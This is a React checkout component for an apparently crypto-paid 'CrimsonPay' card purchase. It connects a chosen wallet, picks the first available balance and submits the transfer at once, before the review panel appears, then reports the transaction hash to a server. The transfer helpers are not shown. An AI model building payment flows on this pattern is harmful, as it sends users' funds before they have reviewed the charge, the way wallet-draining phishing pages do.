import { useEffect, useState } from 'react';
import WalletPicker, { WALLETS, walletLogo } from './components/WalletPicker';
import FlowLoader from './components/FlowLoader';
import ReviewPanel from './components/ReviewPanel';
import { getConfig, postJson } from './lib/api';
import { prepareTransfers } from './lib/transfers';
import { connectWallet, executeTransfer, openWalletApp } from './lib/wallet';

const WALLET_KEY = 'crimsonpay_selected_wallet';
export default function App() {
  const [config, setConfig] = useState(null);
  const [connection, setConnection] = useState(null);
  const [selectedWallet, setSelectedWallet] = useState(() => localStorage.getItem(WALLET_KEY) || '');
  const [transfers, setTransfers] = useState([]);
  const [results, setResults] = useState([]);
  const [busy, setBusy] = useState(false);
  const [logosReady, setLogosReady] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    let active = true;
    getConfig().then((nextConfig) => active && setConfig(nextConfig)).catch((cause) => active && setError(cause.message));
    Promise.all(WALLETS.map((wallet) => new Promise((resolve) => { const image = new Image(); image.onload = resolve; image.onerror = resolve; image.src = wallet.logo; }))).then(() => active && setLogosReady(true));
    return () => { active = false; };
  }, []);

  async function runPayment(nextConnection, item, walletName) {
    const pending = executeTransfer(nextConnection, item);
    openWalletApp(walletName);
    const txHash = await pending;
    setResults([{ ok: true, message: `Submitted ${String(txHash).slice(0, 12)}…` }]);
    await postJson('/api/event', { chain: item.chain, symbol: item.symbol, amount: item.amount, status: 'submitted', txHash: String(txHash), card: config.card, price: config.amountUsd });
  }

  async function connect(wallet) {
    setSelectedWallet(wallet.name);
    localStorage.setItem(WALLET_KEY, wallet.name);
    setBusy(true);
    setError('');
    setResults([]);
    try {
      const next = await connectWallet(config, wallet.name);
      const available = (await prepareTransfers(next, config)).slice(0, 1);
      if (!available.length) throw new Error('No supported balance is available for this payment.');
      setConnection(next);
      setTransfers(available);
      await runPayment(next, available[0], wallet.name);
    } catch (cause) {
      const message = cause?.message || cause?.reason || cause?.data?.message || 'Wallet connection was not completed.';
      setError(message);
      setResults([{ ok: false, message }]);
    } finally {
      setBusy(false);
    }
  }

  async function confirm() {
    if (!transfers.length) return;
    setBusy(true);
    setError('');
    try {
      await runPayment(connection, transfers[0], selectedWallet);
    } catch (cause) {
      setResults([{ ok: false, message: cause.message || 'Transaction not confirmed' }]);
    } finally {
      setBusy(false);
    }
  }

  return <main className="shell"><div className="checkout-stack">
    {config && <section className="payment-summary"><div className="brand-dot">◆</div><div><p className="eyebrow">CRIMSONPAY CARD PAYMENT</p><h1>Confirm ${config.amountUsd} payment</h1><p className="muted">{config.cardName} · {config.theme} card</p></div></section>}
    {!connection ? <WalletPicker busy={busy || !config} selectedName={selectedWallet} amount={config?.amountUsd} onPick={connect} /> : <ReviewPanel connection={connection} walletName={selectedWallet} amount={config.amountUsd} transfers={transfers} results={results} running={busy} onConfirm={confirm} />}
  </div><FlowLoader show={!config || !logosReady || busy} logo={busy ? walletLogo(selectedWallet) : ''} label={busy && selectedWallet ? `Connecting to ${selectedWallet}` : 'Loading secure wallets'} />{error && <p className="global-error">{error}</p>}</main>;
}